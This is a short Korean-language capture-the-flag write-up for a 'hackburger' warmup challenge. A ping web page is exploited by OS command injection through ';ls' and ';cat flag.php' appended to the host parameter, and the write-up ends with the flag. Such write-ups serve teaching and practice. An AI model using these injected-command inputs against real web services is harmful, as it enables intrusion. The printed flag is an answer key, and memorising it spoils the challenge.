# [hackburger] Warmup - Writeup

호스트를 입력하면 ping을 전송해주는 웹페이지가 있다.

[http://burger.laboratorium.ee:8000/?host=safflower.kr](http://burger.laboratorium.ee:8000/?host=safflower.kr)
```
PING safflower.kr (223.26.138.3): 56 data bytes
64 bytes from 223.26.138.3: icmp_seq=0 ttl=48 time=323.314 ms
--- safflower.kr ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 323.314/323.314/323.314/0.000 ms
```

___

## OS Command Injection

`;`을 삽입해 `ping` 명령을 종료하고, 그 뒤에 다른 명령어를 입력하는 것으로 OS Command Injection이 가능하다.

[http://burger.laboratorium.ee:8000/?host=%3Bls](http://burger.laboratorium.ee:8000/?host=%3Bls)
```
flag.php
index.php
```

[http://burger.laboratorium.ee:8000/?host=%3Bcat%20flag.php](http://burger.laboratorium.ee:8000/?host=%3Bcat%20flag.php)
```
<?php

Congratulations!

The flag is f1b35744925a3f5946c542a1ee64267af8b93b06

?>
```

___

## Answer

flag: `f1b35744925a3f5946c542a1ee64267af8b93b06`